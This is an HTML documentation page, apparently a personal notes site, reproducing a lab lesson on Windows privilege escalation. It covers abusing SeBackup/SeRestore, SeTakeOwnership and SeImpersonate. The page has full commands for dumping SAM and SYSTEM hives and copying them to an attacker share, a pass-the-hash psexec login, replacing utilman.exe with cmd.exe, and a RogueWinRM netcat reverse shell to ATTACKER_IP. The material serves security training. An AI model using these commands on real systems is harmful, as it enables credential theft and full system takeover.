@@ -1,0 +1,611 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <meta name="generator" content="mkdocs-1.4.3, mkdocs-terminal-4.4.0">
+     
+     
+    <link rel="icon" type="image/png" sizes="192x192" href="../img/android-chrome-192x192.png" />
+<link rel="icon" type="image/png" sizes="512x512" href="../img/android-chrome-512x512.png" />
+<link rel="apple-touch-icon" sizes="180x180" href="../img/apple-touch-icon.png" />
+<link rel="shortcut icon" type="image/png" sizes="48x48" href="../img/favicon.ico" />
+<link rel="icon" type="image/png" sizes="16x16" href="../img/favicon-16x16.png" />
+<link rel="icon" type="image/png" sizes="32x32" href="../img/favicon-32x32.png" />
+
+
+    
+ 
+<title>hackthebox - My Docs</title>
+
+
+<link href="../css/fontawesome/css/fontawesome.min.css" rel="stylesheet">
+<link href="../css/fontawesome/css/solid.min.css" rel="stylesheet">
+<link href="../css/normalize.css" rel="stylesheet">
+<link href="../css/terminal.css" rel="stylesheet">
+<link href="../css/theme.css" rel="stylesheet">
+<link href="../css/theme.tile_grid.css" rel="stylesheet">
+<link href="../css/theme.footer.css" rel="stylesheet">
+<!-- gruvbox_dark color palette -->
+<link href="../css/palettes/gruvbox_dark.css" rel="stylesheet">
+
+<!-- page layout -->
+<style>
+/* initially set page layout to a one column grid */
+.terminal-mkdocs-main-grid {
+    display: grid;
+    grid-column-gap: 1.4em;
+    grid-template-columns: auto;
+    grid-template-rows: auto;
+}
+
+/*  
+*   when side navigation is not hidden, use a two column grid.  
+*   if the screen is too narrow, fall back to the initial one column grid layout.
+*   in this case the main content will be placed under the navigation panel. 
+*/
+@media only screen and (min-width: 70em) {
+    .terminal-mkdocs-main-grid {
+        grid-template-columns: 4fr 9fr;
+    }
+}</style>
+
+
+
+     
+    
+    
+
+    
+    <!-- search css support -->
+<link href="../css/search/bootstrap-modal.css" rel="stylesheet">
+<!-- search scripts -->
+<script>
+    var base_url = "..",
+    shortcuts = "{}";
+</script>
+<script src="../js/jquery/jquery-1.10.1.min.js" defer></script>
+<script src="../js/bootstrap/bootstrap.min.js" defer></script>
+<script src="../js/mkdocs/base.js" defer></script>
+    
+    
+    
+    
+    <script src="../search/main.js"></script>
+    
+
+    
+</head>
+
+<body class="terminal"><div class="container">
+    <div class="terminal-nav">
+        <header class="terminal-logo">
+            <div id="mkdocs-terminal-site-name" class="logo terminal-prompt"><a href="/" class="no-style">My Docs</a></div>
+        </header>
+        
+        <nav class="terminal-menu">
+            
+            <ul vocab="https://schema.org/" typeof="BreadcrumbList">
+                
+                
+                <li property="itemListElement" typeof="ListItem">
+                    <a href=".." class="menu-item " property="item" typeof="WebPage">
+                        <span property="name">About Me</span>
+                    </a>
+                    <meta property="position" content="0">
+                </li>
+                
+                
+                
+                
+                <li property="itemListElement" typeof="ListItem">
+                    <a href="./" class="menu-item " property="item" typeof="WebPage">
+                        <span property="name">Writeups</span>
+                    </a>
+                    <meta property="position" content="1">
+                </li>
+                
+                
+                
+                
+                
+                
+                <li property="itemListElement" typeof="ListItem">
+                    <a href="../ServiceMisconfigurations/" class="menu-item " property="item" typeof="WebPage">
+                        <span property="name">ServiceMisconfiguration</span>
+                    </a>
+                    <meta property="position" content="2">
+                </li>
+                
+                
+                <li property="itemListElement" typeof="ListItem">
+                    <a href="../vulnerableSoftware/" class="menu-item " property="item" typeof="WebPage">
+                        <span property="name">VulnerableSoftwares</span>
+                    </a>
+                    <meta property="position" content="3">
+                </li>
+                
+                    
+                    
+
+
+<li property="itemListElement" typeof="ListItem">
+    <a href="#" class="menu-item" data-toggle="modal" data-target="#mkdocs_search_modal" property="item" typeof="SearchAction">
+        <i aria-hidden="true" class="fa fa-search"></i> <span property="name">Search</span>
+    </a>
+    <meta property="position" content="4">
+</li>
+                    
+            </ul>
+            
+        </nav>
+    </div>
+</div>
+        
+    <div class="container">
+        <div class="terminal-mkdocs-main-grid"><aside id="terminal-mkdocs-side-panel"><nav>
+  
+    <ul class="terminal-mkdocs-side-nav-items">
+        
+          
+
+
+
+<li class="terminal-mkdocs-side-nav-li">
+    
+    
+    
+        
+        
+            <a class="
+
+    terminal-mkdocs-side-nav-item" href="..">About Me</a>
+        
+    
+    
+    
+  </li>
+        
+          
+
+
+
+<li class="terminal-mkdocs-side-nav-li">
+    
+    
+        
+        
+            
+            
+                
+                
+        
+
+             
+            
+    
+        
+        <a class="
+
+    terminal-mkdocs-side-nav-item" href="../About_Me/">About</a>
+    
+    
+        
+      
+        
+            <ul class="terminal-mkdocs-side-nav-li-ul">
+            
+    </ul>
+        
+    
+  </li>
+        
+          
+
+
+
+<li class="terminal-mkdocs-side-nav-li">
+    
+    
+    
+        
+        
+            <a class="
+
+    terminal-mkdocs-side-nav-item" href="./">Writeups</a>
+        
+    
+    
+    
+  </li>
+        
+          
+
+
+
+<li class="terminal-mkdocs-side-nav-li">
+    
+    
+        
+        
+            
+                
+        
+
+        
+            
+    
+        
+        <span class="
+        
+            
+        
+    
+
+    terminal-mkdocs-side-nav-item--active terminal-mkdocs-side-nav-section-no-index">Linux</span>
+    
+    
+        
+      
+        
+            <ul class="terminal-mkdocs-side-nav-li-ul">
+        
+            
+            
+                
+                
+            
+
+             
+                <li class="terminal-mkdocs-side-nav-li-ul-li">
+    
+        
+        
+            <a class="
+
+    terminal-mkdocs-side-nav-item" href="./">tryhackme</a>
+        
+    
+    </li>
+            
+        
+            
+            
+                
+                
+            
+
+             
+                <li class="terminal-mkdocs-side-nav-li-ul-li">
+    
+        
+        <span class="
+
+    terminal-mkdocs-side-nav-item--active">hackthebox</span>
+    
+    </li>
+            
+            
+    </ul>
+        
+    
+  </li>
+        
+          
+
+
+
+<li class="terminal-mkdocs-side-nav-li">
+    
+    
+        
+        
+            
+            
+                
+                
+        
+
+             
+            
+    
+        
+        <a class="
+
+    terminal-mkdocs-side-nav-item" href="../vulnerableSoftware/">PrivilegeEscalation</a>
+    
+    
+        
+      
+        
+            <ul class="terminal-mkdocs-side-nav-li-ul">
+        
+            
+            
+                
+                
+                    
+                
+            
+
+            
+                <li class="terminal-mkdocs-side-nav-li-ul-li">
+    
+        
+        <a class="
+
+    terminal-mkdocs-side-nav-item" href="../ServiceMisconfigurations/">Windows</a>
+    
+    </li>
+            
+            
+    </ul>
+        
+    
+  </li>
+        
+          
+
+
+
+<li class="terminal-mkdocs-side-nav-li">
+    
+    
+    
+        
+        
+            <a class="
+
+    terminal-mkdocs-side-nav-item" href="../ServiceMisconfigurations/">ServiceMisconfiguration</a>
+        
+    
+    
+    
+  </li>
+        
+          
+
+
+
+<li class="terminal-mkdocs-side-nav-li">
+    
+    
+    
+        
+        
+            <a class="
+
+    terminal-mkdocs-side-nav-item" href="../vulnerableSoftware/">VulnerableSoftwares</a>
+        
+    
+    
+    
+  </li>
+        
+    </ul>
+  
+</nav><hr>
+<nav>
+    <ul>
+        <li><a href="#windows-privileges">Windows Privileges</a></li>
+        <li><a href="#sebackup-serestore">SeBackup / SeRestore</a></li>
+        <li><a href="#setakeownership">SeTakeOwnership</a></li>
+        <li><a href="#seimpersonate-seassignprimarytoken">SeImpersonate / SeAssignPrimaryToken</a></li>
+        
+    </ul>
+</nav>
+</aside>
+            <main id="terminal-mkdocs-main-content">
+<section id="mkdocs-terminal-content">
+    <h2 id="windows-privileges">Windows Privileges<a class="headerlink" href="#windows-privileges" title="Anchor link to this section for reference">#</a></h2>
+<p>Privileges are rights that an account has to perform specific system-related tasks. These tasks can be as simple as the privilege to shut down the machine up to privileges to bypass some DACL-based access controls.</p>
+<p>Each user has a set of assigned privileges that can be checked with the following command:</p>
+<pre><code class="language-shell-session">whoami /priv
+</code></pre>
+<p>A complete list of available privileges on Windows systems is available <a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants">here</a>. From an attacker's standpoint, only those privileges that allow us to escalate in the system are of interest. You can find a comprehensive list of exploitable privileges on the <a href="https://github.com/gtworek/Priv2Admin">Priv2Admin</a> Github project.</p>
+<p>While we won't take a look at each of them, we will showcase how to abuse some of the most common privileges you can find.</p>
+<h2 id="sebackup-serestore">SeBackup / SeRestore<a class="headerlink" href="#sebackup-serestore" title="Anchor link to this section for reference">#</a></h2>
+<p>The SeBackup and SeRestore privileges allow users to read and write to any file in the system, ignoring any DACL in place. The idea behind this privilege is to allow certain users to perform backups from a system without requiring full administrative privileges.</p>
+<p>Having this power, an attacker can trivially escalate privileges on the system by using many techniques. The one we will look at consists of copying the SAM and SYSTEM registry hives to extract the local Administrator's password hash.</p>
+<p>Log in to the target machine via RDP using the following credentials:</p>
+<p><strong>User:</strong> <code>THMBackup</code></p>
+<p><strong>Password:</strong> <code>CopyMaster555</code></p>
+<p>This account is part of the "Backup Operators" group, which by default is granted the SeBackup and SeRestore privileges. We will need to open a command prompt using the "Open as administrator" option to use these privileges. We will be asked to input our password again to get an elevated console:</p>
+<p><img alt="Run as admin" src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/befb434f15dbd4deee0654f8b6ef6de0.png" />  </p>
+<p>Once on the command prompt, we can check our privileges with the following command:</p>
+<p>Command Prompt</p>
+<pre><code class="language-shell-session">C:\&gt; whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== ========
+SeBackupPrivilege             Back up files and directories  Disabled
+SeRestorePrivilege            Restore files and directories  Disabled
+SeShutdownPrivilege           Shut down the system           Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+</code></pre>
+<p>To backup the SAM and SYSTEM hashes, we can use the following commands:</p>
+<p>Command Prompt</p>
+<pre><code class="language-shell-session">C:\&gt; reg save hklm\system C:\Users\THMBackup\system.hive
+The operation completed successfully.
+
+C:\&gt; reg save hklm\sam C:\Users\THMBackup\sam.hive
+The operation completed successfully.
+</code></pre>
+<p>This will create a couple of files with the registry hives content. We can now copy these files to our attacker machine using SMB or any other available method. For SMB, we can use impacket's <code>smbserver.py</code> to start a simple SMB server with a network share in the current directory of our AttackBox:</p>
+<p>Kali Linux</p>
+<pre><code class="language-shell-session">user@attackerpc$ mkdir share
+user@attackerpc$ python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
+</code></pre>
+<p>This will create a share named <code>public</code> pointing to the <code>share</code> directory, which requires the username and password of our current windows session. After this, we can use the <code>copy</code> command in our windows machine to transfer both files to our AttackBox: </p>
+<p>Command Prompt</p>
+<pre><code class="language-shell-session">C:\&gt; copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
+C:\&gt; copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
+</code></pre>
+<p>And use impacket to retrieve the users' password hashes:</p>
+<p>Kali Linux</p>
+<pre><code class="language-shell-session">user@attackerpc$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
+Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation
+
+[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+
+</code></pre>
+<p>We can finally use the Administrator's hash to perform a Pass-the-Hash attack and gain access to the target machine with SYSTEM privileges:</p>
+<p>Kali Linux</p>
+<pre><code class="language-shell-session">user@attackerpc$ python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@10.10.173.241
+Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation
+
+[*] Requesting shares on 10.10.175.90.....
+[*] Found writable share ADMIN$
+[*] Uploading file nfhtabqO.exe
+[*] Opening SVCManager on 10.10.175.90.....
+[*] Creating service RoLE on 10.10.175.90.....
+[*] Starting service RoLE.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt; whoami
+nt authority\system
+</code></pre>
+<h2 id="setakeownership">SeTakeOwnership<a class="headerlink" href="#setakeownership" title="Anchor link to this section for reference">#</a></h2>
+<p>The SeTakeOwnership privilege allows a user to take ownership of any object on the system, including files and registry keys, opening up many possibilities for an attacker to elevate privileges, as we could, for example, search for a service running as SYSTEM and take ownership of the service's executable. For this task, we will be taking a different route, however.</p>
+<p>Log in to the target machine via RDP using the following credentials:</p>
+<p><strong>User:</strong> <code>THMTakeOwnership</code></p>
+<p><strong>Password:</strong> <code>TheWorldIsMine2022</code></p>
+<p>To get the SeTakeOwnership privilege, we need to open a command prompt using the "Open as administrator" option. We will be asked to input our password to get an elevated console:</p>
+<p><img alt="Run as admin" src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/33303d0cde736589d2838ee894379ff2.png" />  </p>
+<p>Once on the command prompt, we can check our privileges with the following command:</p>
+<p>Command Prompt</p>
+<pre><code class="language-shell-session">C:\&gt; whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                              State
+============================= ======================================== ========
+SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set           Disabled
+</code></pre>
+<p>We'll abuse <code>utilman.exe</code> to escalate privileges this time. Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen:</p>
+<p><img alt="utilman normal behaviour" src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/a5437a609e41d982b320967667e9b97a.png" />  </p>
+<p>Since Utilman is run with SYSTEM privileges, we will effectively gain SYSTEM privileges if we replace the original binary for any payload we like. As we can take ownership of any file, replacing it is trivial.</p>
+<p>To replace utilman, we will start by taking ownership of it with the following command:</p>
+<p>Command Prompt</p>
+<pre><code class="language-shell-session">C:\&gt; takeown /f C:\Windows\System32\Utilman.exe
+
+SUCCESS: The file (or folder): &quot;C:\Windows\System32\Utilman.exe&quot; now owned by user &quot;WINPRIVESC2\thmtakeownership&quot;.
+</code></pre>
+<p>Notice that being the owner of a file doesn't necessarily mean that you have privileges over it, but being the owner you can assign yourself any privileges you need. To give your user full permissions over utilman.exe you can use the following command:</p>
+<p>Command Prompt</p>
+<pre><code class="language-shell-session">C:\&gt; icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
+processed file: Utilman.exe
+Successfully processed 1 files; Failed processing 0 files
+</code></pre>
+<p>After this, we will replace utilman.exe with a copy of cmd.exe:</p>
+<p>Command Prompt</p>
+<pre><code class="language-shell-session">C:\Windows\System32\&gt; copy cmd.exe utilman.exe
+        1 file(s) copied.
+</code></pre>
+<p>To trigger utilman, we will lock our screen from the start button:</p>
+<p><img alt="lock screen" src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/dd7290ca93369cee33182023cb9190ff.png" />  </p>
+<p>And finally, proceed to click on the "Ease of Access" button, which runs utilman.exe with SYSTEM privileges. Since we replaced it with a cmd.exe copy, we will get a command prompt with SYSTEM privileges:</p>
+<p><img alt="utilman shell" src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/1401bc3dcb1e4eb84f526b95567a5ef8.png" />  </p>
+<h2 id="seimpersonate-seassignprimarytoken">SeImpersonate / SeAssignPrimaryToken<a class="headerlink" href="#seimpersonate-seassignprimarytoken" title="Anchor link to this section for reference">#</a></h2>
+<p>These privileges allow a process to impersonate other users and act on their behalf. Impersonation usually consists of being able to spawn a process or thread under the security context of another user.</p>
+<p>Impersonation is easily understood when you think about how an FTP server works. The FTP server must restrict users to only access the files they should be allowed to see.</p>
+<p>Let's assume we have an FTP service running with user <code>ftp</code>. Without impersonation, if user Ann logs into the FTP server and tries to access her files, the FTP service would try to access them with its access token rather than Ann's:</p>
+<p><img alt="" src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/6e5768172fbb97d6777dde7e15a3fcfc.png" />  </p>
+<p>There are several reasons why using ftp's token is not the best idea: - For the files to be served correctly, they would need to be accessible to the <code>ftp</code> user. In the example above, the FTP service would be able to access Ann's files, but not Bill's files, as the DACL in Bill's files doesn't allow user <code>ftp</code>. This adds complexity as we must manually configure specific permissions for each served file/directory. - For the operating system, all files are accessed by user <code>ftp</code>, independent of which user is currently logged in to the FTP service. This makes it impossible to delegate the authorisation to the operating system; therefore, the FTP service must implement it. - If the FTP service were compromised at some point, the attacker would immediately gain access to all of the folders to which the <code>ftp</code> user has access.</p>
+<p>If, on the other hand, the FTP service's user has the SeImpersonate or SeAssignPrimaryToken privilege, all of this is simplified a bit, as the FTP service can temporarily grab the access token of the user logging in and use it to perform any task on their behalf:</p>
+<p><img alt="" src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/89e74e14454edc10fa2bd541ac359772.png" />  </p>
+<p>Now, if user Ann logs in to the FTP service and given that the ftp user has impersonation privileges, it can borrow Ann's access token and use it to access her files. This way, the files don't need to provide access to user <code>ftp</code> in any way, and the operating system handles authorisation. Since the FTP service is impersonating Ann, it won't be able to access Jude's or Bill's files during that session.</p>
+<p>As attackers, if we manage to take control of a process with SeImpersonate or SeAssignPrimaryToken privileges, we can impersonate any user connecting and authenticating to that process.</p>
+<p>In Windows systems, you will find that the LOCAL SERVICE and NETWORK SERVICE ACCOUNTS already have such privileges. Since these accounts are used to spawn services using restricted accounts, it makes sense to allow them to impersonate connecting users if the service needs. Internet Information Services (IIS) will also create a similar default account called "iis apppool\defaultapppool" for web applications.</p>
+<p>To elevate privileges using such accounts, an attacker needs the following: 1. To spawn a process so that users can connect and authenticate to it for impersonation to occur. 2. Find a way to force privileged users to connect and authenticate to the spawned malicious process.</p>
+<p>We will use RogueWinRM exploit to accomplish both conditions.</p>
+<p>Let's start by assuming we have already compromised a website running on IIS and that we have planted a web shell on the following address:</p>
+<p><code>http://10.10.173.241/</code></p>
+<p>We can use the web shell to check for the assigned privileges of the compromised account and confirm we hold both privileges of interest for this task:</p>
+<p><img alt="Webshell impersonate privileges" src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/4603506a36f4bbda602dc67cdc845d9f.png" />  </p>
+<p>To use RogueWinRM, we first need to upload the exploit to the target machine. For your convenience, this has already been done, and you can find the exploit in the <code>C:\tools\</code> folder.</p>
+<p>The RogueWinRM exploit is possible because whenever a user (including unprivileged users) starts the BITS service in Windows, it automatically creates a connection to port 5985 using SYSTEM privileges. Port 5985 is typically used for the WinRM service, which is simply a port that exposes a Powershell console to be used remotely through the network. Think of it like SSH, but using Powershell.</p>
+<p>If, for some reason, the WinRM service isn't running on the victim server, an attacker can start a fake WinRM service on port 5985 and catch the authentication attempt made by the BITS service when starting. If the attacker has SeImpersonate privileges, he can execute any command on behalf of the connecting user, which is SYSTEM.</p>
+<p>Before running the exploit, we'll start a netcat listener to receive a reverse shell on our attacker's machine:</p>
+<p>Kali Linux</p>
+<pre><code class="language-shell-session">user@attackerpc$ nc -lvp 4442
+</code></pre>
+<p>And then, use our web shell to trigger the RogueWinRM exploit using the following command:</p>
+<pre><code class="language-shell-session">c:\tools\RogueWinRM\RogueWinRM.exe -p &quot;C:\tools\nc64.exe&quot; -a &quot;-e cmd.exe ATTACKER_IP 4442&quot;
+</code></pre>
+<p><img alt="RogueWinRM exploit execution" src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/24545e313a2e5ddee2386a68b4c7adeb.png" />  </p>
+<p><strong>Note:</strong> The exploit may take up to 2 minutes to work, so your browser may appear as unresponsive for a bit. This happens if you run the exploit multiple times as it must wait for the BITS service to stop before starting it again. The BITS service will stop automatically after 2 minutes of starting.</p>
+<p>The <code>-p</code> parameter specifies the executable to be run by the exploit, which is <code>nc64.exe</code> in this case. The <code>-a</code> parameter is used to pass arguments to the executable. Since we want nc64 to establish a reverse shell against our attacker machine, the arguments to pass to netcat will be <code>-e cmd.exe ATTACKER_IP 4442</code>.</p>
+<p>If all was correctly set up, you should expect a shell with SYSTEM privileges:</p>
+<p>Kali Linux</p>
+<pre><code class="language-shell-session">user@attackerpc$ nc -lvp 4442
+Listening on 0.0.0.0 4442
+Connection received on 10.10.175.90 49755
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+c:\windows\system32\inetsrv&gt;whoami
+nt authority\system
+</code></pre>
+<p>Using any of the three methods discussed in this task, gain access to the Administrator's desktop and collect the flag. Don't forget to input the flag at the end of this task.</p>
+</section>
+
+            </main>
+        </div>
+        <hr><footer>
+    <div class="terminal-mkdocs-footer-grid">
+        <div id="terminal-mkdocs-footer-copyright-info">
+             Site built with <a href="http://www.mkdocs.org">MkDocs</a> and <a href="https://github.com/ntno/mkdocs-terminal">Terminal for MkDocs</a>.
+        </div>
+        <div id="terminal-mkdocs-footer-prev-next">
+            <nav class="btn-group">
+                <a href="./" title="tryhackme">Previous</a>
+                |
+                <a href="../vulnerableSoftware/" title="Index">Next</a>
+            </nav>
+        </div>
+    </div>
+</footer>
+    </div>
+
+    
+    <div class="modal" id="mkdocs_search_modal" tabindex="-1" role="alertdialog" aria-modal="true" aria-labelledby="searchModalLabel">
+    <div class="modal-dialog modal-lg" role="search">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h5 class="modal-title" id="searchModalLabel">Search</h5>
+                <button type="button" class="close btn btn-default btn-ghost" data-dismiss="modal"><span aria-hidden="true">x</span><span class="sr-only">Close</span></button>
+            </div>
+            <div class="modal-body">
+                <p id="searchInputLabel">Type to start searching</p>
+                <form>
+                    <div class="form-group">
+                        <input type="search" class="form-control" aria-labelledby="searchInputLabel" placeholder="" id="mkdocs-search-query" title="Please enter search terms here">
+                    </div>
+                </form>
+                <div id="mkdocs-search-results" data-no-results-text="No document matches found"></div>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div>
+    
+    
+</body>
+
+</html>
